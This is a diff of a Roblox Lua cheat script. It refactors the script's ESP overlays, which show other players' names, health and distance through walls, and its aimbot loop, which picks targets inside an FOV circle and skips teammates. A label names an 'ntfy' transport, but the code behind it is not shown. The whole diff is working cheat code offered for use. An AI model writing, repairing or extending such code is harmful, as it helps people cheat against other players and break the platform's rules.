     fovCircle.Visible = CFG.fovCircle
 end)
 
-makeLabel(main, "Keys:  R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
-makeLabel(main, "Transport: ntfy (universal)", 12, 358, 236, 14, 10)
+makeLabel(main, "R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
+makeLabel(main, "transport: ntfy (universal)", 12, 358, 236, 14, 10)
 
--- FOV circle
 local fovCircle = Instance.new("Frame")
 fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
 fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
@@ -666,13 +739,12 @@ fovCircle.BackgroundTransparency = 1
 fovCircle.BorderSizePixel = 0
 fovCircle.Parent = gui
 local fstroke = Instance.new("UIStroke")
-fstroke.Color = Color3.fromRGB(180, 90, 240)
+fstroke.Color = Color3.fromRGB(190, 100, 255)
 fstroke.Thickness = 1
 fstroke.Parent = fovCircle
 local fcorner = Instance.new("UICorner"); fcorner.CornerRadius = UDim.new(1, 0); fcorner.Parent = fovCircle
 pulseStroke(fstroke)
 
--- ESP objects
 local esp = {}
 
 local function buildEsp(plr)
@@ -688,10 +760,10 @@ local function buildEsp(plr)
     box.AlwaysOnTop = true
     box.Size = Vector3.new(2.2, 2.6, 1.2)
     box.Transparency = 0.5
-    box.Color3 = Color3.fromRGB(180, 90, 240)
+    box.Color3 = Color3.fromRGB(190, 100, 255)
     box.Visible = CFG.espBox
     box.Parent = gui
-    table.insert(bucket, box)
+    bucket.box = box
 
     local bill = Instance.new("BillboardGui")
     bill.Size = UDim2.new(0, 140, 0, 44)
@@ -699,21 +771,20 @@ local function buildEsp(plr)
     bill.AlwaysOnTop = true
     bill.Adornee = plr.Character
     bill.Parent = gui
-    table.insert(bucket, bill)
+    bucket.bill = bill
 
     local nameL = Instance.new("TextLabel")
     nameL.BackgroundTransparency = 1
     nameL.Size = UDim2.new(1, 0, 0, 16)
     nameL.Position = UDim2.new(0, 0, 0, 0)
-    nameL.TextColor3 = Color3.fromRGB(230, 220, 255)
+    nameL.TextColor3 = Color3.fromRGB(235, 220, 255)
     nameL.Font = Enum.Font.GothamBold
     nameL.TextSize = 12
     nameL.TextStrokeTransparency = 0
-    nameL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     nameL.Text = plr.Name
     nameL.Visible = CFG.espName
     nameL.Parent = bill
-    table.insert(bucket, nameL)
+    bucket.nameL = nameL
 
     local hpL = Instance.new("TextLabel")
     hpL.BackgroundTransparency = 1
@@ -723,25 +794,23 @@ local function buildEsp(plr)
     hpL.Font = Enum.Font.Gotham
     hpL.TextSize = 11
     hpL.TextStrokeTransparency = 0
-    hpL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     hpL.Text = "100"
     hpL.Visible = CFG.espHP
     hpL.Parent = bill
-    table.insert(bucket, hpL)
+    bucket.hpL = hpL
 
     local distL = Instance.new("TextLabel")
     distL.BackgroundTransparency = 1
     distL.Size = UDim2.new(1, 0, 0, 14)
     distL.Position = UDim2.new(0, 0, 0, 30)
-    distL.TextColor3 = Color3.fromRGB(200, 200, 220)
+    distL.TextColor3 = Color3.fromRGB(210, 200, 240)
     distL.Font = Enum.Font.Gotham
     distL.TextSize = 11
     distL.TextStrokeTransparency = 0
-    distL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     distL.Text = "0m"
     distL.Visible = CFG.espDist
     distL.Parent = bill
-    table.insert(bucket, distL)
+    bucket.distL = distL
 
     esp[plr] = bucket
 end
@@ -755,7 +824,6 @@ Players.PlayerAdded:Connect(function(p)
     buildEsp(p)
 end)
 
--- keybinds
 UIS.InputBegan:Connect(function(i, gp)
     if gp then return end
     if i.KeyCode == Enum.KeyCode.R then
@@ -770,34 +838,26 @@ UIS.InputBegan:Connect(function(i, gp)
     end
 end)
 
--- ============================================================
--- Aim loop
--- ============================================================
 RunService.RenderStepped:Connect(function()
     if CFG.fovCircle then
         fovCircle.Position = UDim2.new(0, Camera.ViewportSize.X / 2, 0, Camera.ViewportSize.Y / 2)
         fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
     end
 
-    -- ESP refresh
     for plr, bucket in pairs(esp) do
         if plr.Character and plr:FindFirstChild("HumanoidRootPart") then
-            for _, o in ipairs(bucket) do
-                if o:IsA("BillboardGui") then o.Adornee = plr.Character end
-                if o:IsA("TextLabel") then
-                    if o.Text:match("^%d+m$") or o == bucket[4] then
-                        local d = (Camera.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude
-                        o.Text = string.format("%dm", math.floor(d))
-                        o.Visible = CFG.espDist
-                    elseif o == bucket[3] then
-                        local hum = plr.Character:FindFirstChildOfClass("Humanoid")
-                        o.Text = hum and tostring(math.floor(hum.Health)) or "0"
-                        o.Visible = CFG.espHP
-                    elseif o == bucket[2] then
-                        o.Visible = CFG.espName
-                    end
-                end
-                if o:IsA("BoxHandleAdornment") then o.Visible = CFG.espBox end
+            if bucket.bill then bucket.bill.Adornee = plr.Character end
+            if bucket.box then bucket.box.Adornee = plr.Character; bucket.box.Visible = CFG.espBox end
+            if bucket.nameL then bucket.nameL.Visible = CFG.espName end
+            if bucket.hpL then
+                local hum = plr.Character:FindFirstChildOfClass("Humanoid")
+                bucket.hpL.Text = hum and tostring(math.floor(hum.Health)) or "0"
+                bucket.hpL.Visible = CFG.espHP
+            end
+            if bucket.distL then
+                local d = (Camera.CFrame.Position - plr.Character.HumanoidRootPart.Position).Magnitude
+                bucket.distL.Text = string.format("%dm", math.floor(d))
+                bucket.distL.Visible = CFG.espDist
             end
         end
     end
@@ -812,9 +872,7 @@ RunService.RenderStepped:Connect(function()
         if p ~= LP and p.Character then
             local hum = p.Character:FindFirstChildOfClass("Humanoid")
             if hum and hum.Health > 0 then
-                if CFG.team and p.Team and LP.Team and p.Team == LP.Team then
-                    -- skip teammate
-                else
+                if not (CFG.team and p.Team and LP.Team and p.Team == LP.Team) then
                     local part = p.Character:FindFirstChild(CFG.bone) or p.Character:FindFirstChild("Head")
                     if part then
                         local scr, onScreen = Camera:WorldToViewportPoint(part.Position)
